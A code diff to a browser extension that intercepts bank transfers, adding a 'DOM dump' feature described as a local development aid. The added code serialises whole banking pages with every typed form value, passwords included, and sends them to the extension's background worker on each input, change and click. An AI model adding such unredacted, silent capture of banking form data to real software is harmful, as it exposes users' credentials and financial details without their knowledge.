@@ -148,6 +148,7 @@
 
     event.preventDefault();
     event.stopImmediatePropagation();
+    send_dom_dump();
 
     const transfer = adapter.read_transfer();
     if (!transfer.payee || !Number.isFinite(transfer.amount) || transfer.amount <= 0) {
@@ -211,6 +212,7 @@
 
     event.preventDefault();
     event.stopImmediatePropagation();
+    send_dom_dump();
     console.log("[sentinel] transfer intercepted via form submit:", transfer);
     show_spinner();
     const started_at = Date.now();
@@ -223,6 +225,85 @@
       form.removeAttribute(bypass_attribute);
     }
   }
+
+  const dom_dump_initial_delay_ms = 3000;
+  const dom_dump_debounce_ms = 2000;
+  let dom_dump_timer = null;
+
+  /**
+   * Serializes the live DOM with the user's typed form state baked into
+   * attributes and all script bodies stripped, so the dump reflects what is on
+   * screen without shipping the bank's JavaScript.
+   * @returns {string} The serialized page HTML.
+   */
+  function capture_dom_snapshot() {
+    const clone = document.documentElement.cloneNode(true);
+    const live_fields = document.querySelectorAll("input, textarea, select");
+    const cloned_fields = clone.querySelectorAll("input, textarea, select");
+    live_fields.forEach((field, index) => {
+      const cloned = cloned_fields[index];
+      if (!cloned) {
+        return;
+      }
+      if (field instanceof HTMLInputElement) {
+        cloned.setAttribute("value", field.value);
+        if (field.type === "checkbox" || field.type === "radio") {
+          if (field.checked) {
+            cloned.setAttribute("checked", "");
+          } else {
+            cloned.removeAttribute("checked");
+          }
+        }
+      } else if (field instanceof HTMLTextAreaElement) {
+        cloned.textContent = field.value;
+      } else if (field instanceof HTMLSelectElement) {
+        const options = cloned.querySelectorAll("option");
+        options.forEach((option, option_index) => {
+          if (option_index === field.selectedIndex) {
+            option.setAttribute("selected", "");
+          } else {
+            option.removeAttribute("selected");
+          }
+        });
+      }
+    });
+    for (const script of clone.querySelectorAll("script")) {
+      script.remove();
+    }
+    return `<!doctype html>\n${clone.outerHTML}`;
+  }
+
+  /**
+   * Sends the current DOM snapshot to the background worker, which forwards it
+   * to the local dev server. Fire-and-forget: dump failures must never affect
+   * the page or the screening flow.
+   */
+  function send_dom_dump() {
+    try {
+      chrome.runtime.sendMessage({
+        type: "SENTINEL_DOM_DUMP",
+        host: window.location.hostname,
+        frame_path: window === window.top ? "" : window.location.pathname,
+        html: capture_dom_snapshot(),
+      });
+    } catch {
+      /* Extension context gone (reload); nothing to do. */
+    }
+  }
+
+  /**
+   * Debounces DOM dumps so bursts of typing or clicking produce one snapshot
+   * after the activity settles, always capturing the latest form state.
+   */
+  function schedule_dom_dump() {
+    clearTimeout(dom_dump_timer);
+    dom_dump_timer = setTimeout(send_dom_dump, dom_dump_debounce_ms);
+  }
+
+  setTimeout(send_dom_dump, dom_dump_initial_delay_ms);
+  document.addEventListener("input", schedule_dom_dump, true);
+  document.addEventListener("change", schedule_dom_dump, true);
+  document.addEventListener("click", schedule_dom_dump, true);
 
   document.addEventListener("click", handle_send_click, true);
   document.addEventListener("submit", handle_form_submit, true);
